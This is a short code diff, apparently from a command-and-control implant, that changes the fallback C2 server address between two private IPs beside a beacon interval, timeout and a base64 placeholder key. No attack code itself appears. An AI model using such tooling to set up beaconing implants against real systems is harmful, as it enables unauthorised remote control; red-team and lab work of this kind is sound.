@@ -67,7 +67,7 @@ try:
     ENCRYPTION_KEY = KEY_B64.encode()
 except ImportError:
     # Fallback configuration if config.py is not available
-    C2_URL = "http://192.168.10.57:5000"
+    C2_URL = "http://192.168.0.105:5000"
     BEACON_INTERVAL = 10
     NETWORK_TIMEOUT = 10
     _KEY_B64 = ''.join(['dGhpcyBpcyBhIHNlY3JldCBrZXkgZm9yIGVuY3J5cHRpb24='])
